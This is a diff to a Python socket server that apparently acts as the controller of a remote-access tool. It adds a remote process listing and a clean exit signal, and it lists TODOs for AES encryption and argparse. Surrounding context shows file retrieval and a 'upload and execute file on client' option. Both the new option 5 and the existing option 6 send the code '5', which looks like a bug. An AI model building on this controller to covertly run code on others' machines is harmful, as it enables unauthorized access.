@@ -1,3 +1,6 @@
+# TODO Implement AES encryption
+# TODO Refactor to use ArgParse
+# TODO Refactor to use commands instead of just a menu
 import os
 import sys
 import socket
@@ -92,8 +95,18 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                     progBar.update(len(readBytes))
             print("File retrieved.")
 
-        elif choice == 5: # Retrieve Process List TODO implement
-            exit()
+        elif choice == 5:  # Retrieve Process List
+            handler.send('5'.encode())
+            print("Remote Process List: [PID] [USER] [STATUS] [NAME]")
+
+            numProcs = int(handler.recv(BUFF_SIZE).decode())
+
+            proc = ''
+
+            while proc != 'done':
+                proc = handler.recv(BUFF_SIZE).decode()
+                if proc != 'done':
+                    print(proc)
 
         elif choice == 6:  # upload and execute file on client
             handler.send('5'.encode())
@@ -130,6 +143,8 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
 
         elif choice == 0:
             print("Exiting. Have a nice day.")
+            handler.send('0'.encode())
             sys.exit()
+
         else:
             print("Invalid command.")
